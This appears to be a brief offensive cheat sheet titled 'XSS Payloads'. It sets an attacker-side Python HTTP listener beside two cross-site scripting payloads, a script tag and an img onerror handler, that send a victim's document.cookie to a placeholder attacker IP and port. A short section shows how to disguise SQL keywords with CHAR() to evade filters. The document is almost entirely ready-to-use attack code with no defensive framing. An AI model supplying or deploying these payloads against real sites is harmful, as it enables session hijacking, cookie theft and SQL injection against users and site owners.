# XSS Payloads




## Cookies
-<https://pswalia2u.medium.com/exploiting-xss-stealing-cookies-csrf-2325ec03136e>

Attacker:
```
python -m http.server [Attacker Port]
```

Target:
```
<script>var i=new Image(); i.src="http://[Attacker IP]:[Attacker Port]/?cookie="+btoa(document.cookie);</script>
```



<img src=x onerror=fetch('http://[Attacker IP]:[Attacker Port]	/?c='+document.cookie);>





## SQL
Obfuscation via the SQL `CHAR()` function. Hex codes must be prefixed with `0x`.
For example, both `CHAR(83)` and `CHAR(0x53)` return the capital letter S.

Example: `SELECT` is `CHAR(83)+CHAR(69)+CHAR(76)+CHAR(69)+CHAR(67)+CHAR(84)`